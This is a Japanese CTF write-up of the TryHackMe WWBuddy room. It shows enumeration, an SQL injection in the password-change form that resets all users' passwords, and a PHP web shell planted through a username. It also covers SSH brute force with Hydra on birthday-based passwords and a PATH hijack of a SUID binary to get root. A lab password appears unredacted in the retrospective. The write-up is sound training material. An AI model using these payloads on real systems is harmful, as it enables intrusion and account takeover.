# WWBuddy CTF

https://tryhackme.com/room/wwbuddy

## Enumeration

```shell
TARGET=10.48.148.205
sudo bash -c "echo $TARGET   ww.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

SSH, HTTP のみ。

```sh
root@ip-10-48-76-237:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.48.148.205
+ Target Hostname:    ww.thm
+ Target Port:        80
+ Start Time:         2025-12-01 00:56:47 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ Root page / redirects to: /login
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1/images/".
+ OSVDB-3092: /login/: This might be interesting...
+ OSVDB-3092: /register/: This might be interesting...
+ 1707 items checked: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2025-12-01 00:56:48 (GMT0) (1 seconds)
---------------------------------------------------------------------------
```

XSSを想定。

### ディレクトリ列挙

```sh
dirb http://$TARGET

---- Scanning URL: http://10.48.148.205/ ----
==> DIRECTORY: http://10.48.148.205/admin/                                                                           
==> DIRECTORY: http://10.48.148.205/api/                                                                             
==> DIRECTORY: http://10.48.148.205/change/                                                                          
==> DIRECTORY: http://10.48.148.205/images/                                                                          
+ http://10.48.148.205/index.php (CODE:302|SIZE:7740)                                                                
==> DIRECTORY: http://10.48.148.205/js/                                                                              
==> DIRECTORY: http://10.48.148.205/login/                                                                           
==> DIRECTORY: http://10.48.148.205/profile/                                                                         
==> DIRECTORY: http://10.48.148.205/register/                                                                        
+ http://10.48.148.205/server-status (CODE:403|SIZE:278)                                                             
==> DIRECTORY: http://10.48.148.205/styles/
```

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -q -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 64 -k

/.php                 (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.48.148.205/admin/]
/api                  (Status: 301) [Size: 312] [--> http://10.48.148.205/api/]
/change               (Status: 301) [Size: 315] [--> http://10.48.148.205/change/]
/chat.php             (Status: 200) [Size: 1129]
/config.php           (Status: 200) [Size: 0]
/images               (Status: 301) [Size: 315] [--> http://10.48.148.205/images/]
/index.php            (Status: 302) [Size: 7740] [--> /login]
/js                   (Status: 301) [Size: 311] [--> http://10.48.148.205/js/]
/login                (Status: 301) [Size: 314] [--> http://10.48.148.205/login/]
/logout.php           (Status: 302) [Size: 0] [--> /login]
/profile              (Status: 301) [Size: 316] [--> http://10.48.148.205/profile/]
/register             (Status: 301) [Size: 317] [--> http://10.48.148.205/register/]
/styles               (Status: 301) [Size: 315] [--> http://10.48.148.205/styles/]
```

## web

機能一覧。

- ユーザー登録
- ログイン
- チャット
- パスワード変更
- プロフィール編集
- プロフィール表示

WWBuddy がスーパーユーザーと思われる。

```html
<script>
    var users = {"fc18e5f4aa09bbbb7fdedf5e277dda00":"WWBuddy"};
    var uid = "6106035d8bd0b30bb5e5b681315bd4dc";
</script>
```

`http://ww.thm/profile/?uid=6106035d8bd0b30bb5e5b681315bd4dc` の形でプロフィールにアクセスできる。

### XSS

- チャットに入力してもタグがそのまま表示される
- `</textarea>` のクローズタグを挿入しても同じ
- プロフィール項目もタグがそのまま表示される

### SQLi

ログイン、チャット、パスワード変更、プロフィール編集に対して sqlmap を実行したが空振り。

### パスワード変更

- `pass' where uid='fc18e5f4aa09bbbb7fdedf5e277dda00'-- -`
- `pass'-- -`

等で他人のユーザーパスワードの変更を試みたが、全体が自分のパスワードになるだけ。

ユーザー名を `' or 1=1-- -` としてパスワード変更すると、全ユーザーのパスワードを変更でき、WWBuddy としてログイン可能になった。

ログイン後、HenryとRobertoユーザーを発見。

### Henry と Roberto の会話

SSHのデフォルトパスワードが従業員の誕生日になっている。変えた方が良いと言っているのはRobertoの方。

```txt
Hey dude
?
Well, i think you should change the default password for our accounts in SSH, the employee birthday isn't a secure password :p
haven't you changed yours?
I did, but maybe in the future when you hire more people this can be a problem
I'll look into it
Sooo, will you hire that girl i was talking about?
yeah, she seems good
:DDDDD
She'll be sooo happy when she finds out!!
```

Henry の誕生日：`Birthday:12/12/1212`  
Roberto の誕生日：`Birthday:04/14/1995`

### admin

Henry で /admin にアクセスできた。

```txt
Hey Henry, i didn't made the admin functions for this page yet, but at least you can see who's trying to sniff into our site here.
192.168.0.139 2020-07-24 22:54:34 WWBuddy fc18e5f4aa09bbbb7fdedf5e277dda00
192.168.0.139 2020-07-24 22:56:09 Roberto b5ea6181006480438019e76f8100249e
10.48.76.237 2025-12-01 00:56:47
10.48.76.237 2025-12-01 00:56:48
10.48.76.237 2025-12-01 00:58:07
10.48.76.237 2025-12-01 00:58:08
192.168.138.236 2025-12-01 01:38:59 thm 7e97d6e5a2dd06569de505cc4a19253e
192.168.138.236 2025-12-01 01:39:06 thm 7e97d6e5a2dd06569de505cc4a19253e
192.168.138.236 2025-12-01 01:39:21
192.168.138.236 2025-12-01 02:32:07 WWBuddy fc18e5f4aa09bbbb7fdedf5e277dda00
192.168.138.236 2025-12-01 02:32:22 Roberto b5ea6181006480438019e76f8100249e
```

X-Forwarded-For を操作したがIPアドレスの表示は変わらなかった。  
名前を

```
<?=`$_GET[0]`?>
``` 

として /admin に不正アクセス後、Henryとして http://ww.thm/admin/?0=id にアクセスするとコマンド実行成功。

```sh
192.168.138.236 2025-12-01 02:38:03 uid=33(www-data) gid=33(www-data) groups=33(www-data) 6106035d8bd0b30bb5e5b681315bd4dc
```

ホームディレクトリ。jenny ユーザーを発見。

```sh
total 20
drwxr-xr-x  5 root    root    4096 Jul 28  2020 .
drwxr-xr-x 23 root    root    4096 Jul 25  2020 ..
drwx------  2 jenny   jenny   4096 Jul 27  2020 jenny
drwx------  3 roberto roberto 4096 Jul 27  2020 roberto
drwx------  6 wwbuddy wwbuddy 4096 Jul 28  2020 wwbuddy
```

config.php 

```php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'password123');
define('DB_NAME', 'app');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

webフラグはアクセスログの中にあった。

```sh
www-data@wwbuddy:/var/www/html$ find / -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/usr/share/*" -not -path "/usr/src/*" -not -path "/usr/lib/*" -not -path "/snap/core*" -exec grep -i -I "THM{" {} /dev/null \; 2>/dev/ll | awk 'length($0) < 1000'
/var/www/html/admin/access.log:<!--THM{[REDACTED]} --
```

## 権限昇格１

/bin/authenticate にSUIDが付いている。deveroper グループにユーザーを追加する機能だが・・・？  
UID1000以上が対象なので、www-data では使えない。

```c
undefined8 main(void)
{
  __uid_t _Var1;
  int iVar2;
  char *__src;
  long in_FS_OFFSET;
  char local_48 [56];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  _Var1 = getuid();
  if ((int)_Var1 < 1000) {
    puts("You need to be a real user to be authenticated.");
  }
  else {
    iVar2 = system("groups | grep developer");
    if (iVar2 == 0) {
      puts("You are already a developer.");
    }
    else {
      __src = getenv("USER");
      _Var1 = getuid();
      setuid(0);
      builtin_strncpy(local_48,"usermod -G developer ",0x16);
      local_48[0x16] = '\0';
      local_48[0x17] = '\0';
      local_48[0x18] = '\0';
      local_48[0x19] = '\0';
      local_48[0x1a] = '\0';
      local_48[0x1b] = '\0';
      local_48[0x1c] = '\0';
      local_48[0x1d] = '\0';
      local_48[0x1e] = '\0';
      local_48[0x1f] = '\0';
      local_48[0x20] = '\0';
      local_48[0x21] = '\0';
      local_48[0x22] = '\0';
      local_48[0x23] = '\0';
      local_48[0x24] = '\0';
      local_48[0x25] = '\0';
      local_48[0x26] = '\0';
      local_48[0x27] = '\0';
      local_48[0x28] = '\0';
      local_48[0x29] = '\0';
      local_48[0x2a] = '\0';
      local_48[0x2b] = '\0';
      local_48[0x2c] = 0;
      strncat(local_48,__src,0x14);
      system(local_48);
      puts("Group updated");
      setuid(_Var1);
      system("newgrp developer");
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

ユーザーとグループの関係。

```sh
www-data@wwbuddy:/var/www/html$ id jenny
uid=1002(jenny) gid=1002(jenny) groups=1002(jenny)

www-data@wwbuddy:/var/www/html$ id roberto
uid=1001(roberto) gid=1001(roberto) groups=1001(roberto),200(developer)

www-data@wwbuddy:/var/www/html$ id wwbuddy
uid=1000(wwbuddy) gid=1000(wwbuddy) groups=1000(wwbuddy),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

mysqlのログにRobertoのパスワードが出ていた。SSH接続可能。

```sh
www-data@wwbuddy:/tmp$ cat /var/log/mysql/general.log | grep Roberto
2020-07-25T15:01:40.143760Z        12 Execute   SELECT id, username, password FROM users WHERE username = 'Roberto[REDACTED]'
2020-07-25T15:02:00.019056Z        13 Execute   SELECT id, username, password FROM users WHERE username = 'Roberto'
```

## 権限昇格２

```sh
$ ls -al
total 36
drwx------ 5 roberto roberto 4096 Dec  1 03:14 .
drwxr-xr-x 5 root    root    4096 Jul 28  2020 ..
-rw------- 1 roberto roberto    0 Jul 28  2020 .bash_history
-rw-r--r-- 1 roberto roberto  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 roberto roberto 3771 Apr  4  2018 .bashrc
drwx------ 2 roberto roberto 4096 Dec  1 03:14 .cache
drwx------ 3 roberto roberto 4096 Dec  1 03:14 .gnupg
-rw-rw-r-- 1 roberto roberto  246 Jul 27  2020 importante.txt
drwxrwxr-x 3 roberto roberto 4096 Jul 27  2020 .local
-rw-r--r-- 1 roberto roberto  807 Apr  4  2018 .profile
```

Jennyは来週26歳になる。(2020/07/27 のメモ)  
生年月日推定すると、`1994/08/03〜1994/08/09` の範囲になる。

```sh
$ cat ./importante.txt  
A Jenny vai ficar muito feliz quando ela descobrir que foi contratada :DD

Não esquecer que semana que vem ela faz 26 anos, quando ela ver o presente que eu comprei pra ela, talvez ela até anima de ir em um encontro comigo.
```

日付のフォーマットが分からないので、ChatGPTに網羅するスクリプトを作ってもらった。

```python
from datetime import datetime, timedelta

# 対象日付範囲
start = datetime(1994, 8, 3)
end = datetime(1994, 8, 9)

# 代表的な日付フォーマット一覧
formats = [
    "%Y/%m/%d", "%Y-%m-%d", "%Y.%m.%d", "%Y %m %d", "%Y%m%d",
    "%y/%m/%d", "%y-%m-%d", "%y.%m.%d", "%y%m%d",
    "%d/%m/%Y", "%d-%m-%Y", "%d.%m.%Y",
    "%m/%d/%Y", "%m-%d-%Y", "%m.%d.%Y",
    "%d %b %Y", "%d %B %Y", "%b %d %Y", "%B %d %Y",
    "%Y %b %d", "%Y %B %d", "%b %d, %Y", "%B %d, %Y",
    "%d-%b-%Y", "%d-%B-%Y", "%Y-%b-%d", "%Y-%B-%d",
]

d = start
while d <= end:
    for f in formats:
        print(d.strftime(f))
    d += timedelta(days=1)
```

jenny のパスワード判明。

```sh
$ hydra -l jenny -P ./dates.txt $TARGET ssh -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-01 12:42:41
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 30 tasks per 1 server, overall 30 tasks, 189 login tries (l:1/p:189), ~7 tries per task
[DATA] attacking ssh://10.48.148.205:22/
[22][ssh] host: 10.48.148.205   login: jenny   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-01 12:42:47
```

## 権限昇格３

/bin/authenticate のこの部分でPATHインジェクションが可能か？

```c
      setuid(0);
      builtin_strncpy(local_48,"usermod -G developer ",0x16);
```

昇格成功。

```sh
$ cat /home/jenny/usermod
/bin/bash -p

$ chmod +x ./usermod

$ export PATH=/home/jenny:$PATH
$ /bin/authenticate
root@wwbuddy:~# id
uid=0(root) gid=1002(jenny) groups=1002(jenny)
```

## 振り返り

- Webユーザーにこれ見よがしにUIDが付いていたので、パスワード変更のSQLで名前がWhere条件になっていることは想像しにくかった。
- システム上のファイルからパスワードを探すのは現実的なシナリオとしては重要だが、CTFで出てくると結構つらい。
- mysqlのログについて、Robertoでgrepしたら２行が出たが、linpeasの出力ではその行が出ていなかった。単純にpasswordという文字列でgrepしているわけではなく何らかのルールに従って判定していると思われる。今回の場合はそのせいで見落としていた。

grep

```sh
www-data@wwbuddy:/tmp$ cat /var/log/mysql/general.log | grep Roberto
2020-07-25T15:01:40.143760Z        12 Execute   SELECT id, username, password FROM users WHERE username = 'RobertoyVnocsXsf%X68wf'
2020-07-25T15:02:00.019056Z        13 Execute   SELECT id, username, password FROM users WHERE username = 'Roberto'
```

linpeas

```sh
/var/log/mysql/general.log:2020-07-25T14:41:25.299556Z      8 Connect   Access denied for user 'root'@'localhost' (using password: YES)
/var/log/mysql/general.log:2020-07-25T14:41:25.309467Z      9 Connect   Access denied for user 'root'@'localhost' (using password: YES)
/var/log/mysql/general.log:2020-07-25T14:41:25.317916Z     10 Connect   Access denied for user 'root'@'localhost' (using password: NO)
/var/log/mysql/general.log:2020-07-25T15:01:40.143115Z     12 Prepare   SELECT id, username, password FROM users WHERE username = ?
/var/log/mysql/general.log:2020-07-25T15:02:00.018975Z     13 Prepare   SELECT id, username, password FROM users WHERE username = ?
/var/log/mysql/general.log:2020-07-25T15:02:00.019056Z     13 Execute   SELECT id, username, password FROM users WHERE username = 'Roberto'
```



## Tags

#tags:SQLインジェクション #tags:PATHインジェクション
